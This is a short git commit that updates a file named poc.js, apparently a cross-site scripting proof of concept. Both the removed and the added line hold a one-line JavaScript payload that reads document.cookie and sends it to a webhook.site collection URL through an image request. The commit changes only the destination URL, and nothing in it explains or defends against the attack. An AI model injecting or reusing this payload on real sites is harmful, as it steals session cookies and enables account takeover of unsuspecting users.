bbc2368bfbade39e9ab236cf0424bb0d64a408b5
0xcafecafe <69204114+0xcafecafe@users.noreply.github.com>
2023-02-10 23:10:12 -0500

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,1 +1,1 @@
-var i=new Image;i.src="https://webhook.site/d7e59349-c61a-498b-9c00-5fad97a9e293/?cookie="+document.cookie;
+var i=new Image;i.src="https://webhook.site/405c1e1b-1634-44ce-a743-10ad9e4875f6/?cookie="+document.cookie;
